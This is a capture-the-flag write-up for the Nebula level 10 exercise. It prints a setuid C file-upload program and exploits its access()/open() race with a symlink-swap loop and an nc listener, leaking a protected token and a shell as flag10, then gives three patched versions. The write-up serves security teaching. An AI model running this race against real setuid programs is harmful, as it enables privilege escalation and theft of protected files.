# Level 10

The setuid binary at **/home/flag10/flag10** binary will upload any file given, as long as it meets the requirements of the access() system call.

To do this level, log in as the **level10** account with the password **level10**. Files for this level can be found in /home/flag10.

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

## Writeup

In this challenge there are one binary (**flag10**) and a file (**token**) inside the **/home/flag10** directory.

```bash
level10@nebula:/home/flag10$ ll
total 14
drwxr-x--- 2 flag10 level10   93 2011-11-20 21:22 ./
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ../
-rw-r--r-- 1 flag10 flag10   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag10 flag10  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10*
-rw-r--r-- 1 flag10 flag10   675 2011-05-18 02:54 .profile
-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
```

With the binary **flag10** we can send the content of a file to another pc with a tcp socket on **18211** port.

The **access()** function check the real permission, not the effective permission. That means that the file in input must be readable by the **flag10** account.

Let's create a file on **/tmp** directory:

```bash
touch /tmp/token
```

Now we have created a file readable by **flag10** account.

In the code there is a **TOCTOU** problem (**T**ime **O**f **C**heck **T**ime **O**f **U**se).

There are some operation among the time of check the permission on the file and the time of use this file.

The idea is use a file that the user is able to read and change it to another one while the program execute the operations among the time of use.

To do it, let's create a script that create a symbolic link of the file created on /tmp directory and continually change it into the real **token** file:

```bash
while :; do ln -fs /tmp/token /tmp/link; ln -fs /home/flag10/token /tmp/link; done
```

Open a terminal in **ssh** and run it forever.

After open another terminal in **ssh** and **listen** for tcp connection on port 18211.
We must run the program multiple times to exploit it, because is a race condition.
Let's write the output of every connection on a file:

```bash
while :; do nc.traditional -vlp 18211 >> /tmp/server.txt; done
```

Now we can exploit the binary by execute it with the lower sheduler priority with the command **nice**:

```bash
while :; do nice -n 19 /home/flag10/flag10 /tmp/link 127.0.0.1; done
```

After a couple of seconds stop the program and check on the **/tmp/server.txt** file if the content of token file has been written:

```bash
cat /tmp/server.txt | grep -e ".oO Oo." -e "\n" -v | head -1
```

This is the token:

```bash
level10@nebula:~$ cat /tmp/server.txt | grep -e ".oO Oo." -e "\n" -v | head -1
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

We can now use it to login with **flag10** account:

```bash
su flag10
```

We are now **flag10**:

```bash
sh-4.2$ id
uid=989(flag10) gid=989(flag10) groups=989(flag10)
```

Finally we can launch the **getflag** command:

```bash
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Mitigation #1

This code check permission with the **access()** function, that check **real** permission, but use the **open()** to have access to the file, that check **effettive** permission.

The binary is also **SETUID**, that allow an attacker to user **link swap attack**.

The distance between **access()** and **open()** is too much, this increase the time window to do the exploit.

We can **drop privileges** before the call the **open()** function:

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];
  
  uid_t uid = getuid();
  setresuid(-1, uid, -1);

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

Save the code as **flag10-drop.c** and compile it:

```bash
gcc -o /home/flag10/flag10-drop /home/flag10/flag10-drop.c
```

Set correct privileges:

```bash
chown flag10:level10 /home/flag10/flag10-drop
chmod 4750 /home/flag10/flag10-drop
```

Now the exploit will not work.

## Mitigation #2

A second mitigation can be make symbolic link not usable as file.

We can use the system function **lstat()** to read metadata of link and file. (this version in case of link read the link metadata and not the file metadata pointed by the link).

The code will be:

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

#include <sys/stat.h>   /* include the library */

int main(int argc, char **argv)
{
  char *file;
  char *host;

  struct stat s;    /* define struct stat variable */

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if ((lstat(file, &s)) == -1)  /* lstat the file */
  {
    printf("Unable to stat file: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  if (S_ISLNK(s.st_mode))   /* check if is a link */
  {
    printf("No symbolic links allowed.\n");
    exit(EXIT_FAILURE);
  }

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

Save the code as **flag10-nosymlink.c** and compile it:

```bash
gcc -o /home/flag10/flag10-nosymlink /home/flag10/flag10-nosymlink.c
```

Set correct privileges:

```bash
chown flag10:level10 /home/flag10/flag10-nosymlink
chmod 4750 /home/flag10/flag10-nosymlink
```

With this result:

```bash
level10@nebula:/home/flag10$ /home/flag10/flag10-nosymlink /tmp/link 127.0.0.1
No symbolic links allowed.
```

## Mitigation #3

We can reduce the distance between **access()** and **open()**:

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      ffd = open(file, O_RDONLY);       /* open the file */
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));   /* read the file */
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

Save this version of the code as **flag10-notoctou.c** and compile it:

```bash
gcc -o /home/flag10/flag10-notoctou /home/flag10/flag10-notoctou.c
```

Set correct privileges:

```bash
chown flag10:level10 /home/flag10/flag10-notoctou
chmod 4750 /home/flag10/flag10-notoctou
```

If we try agin the exploit it always work but much slower then the previous one.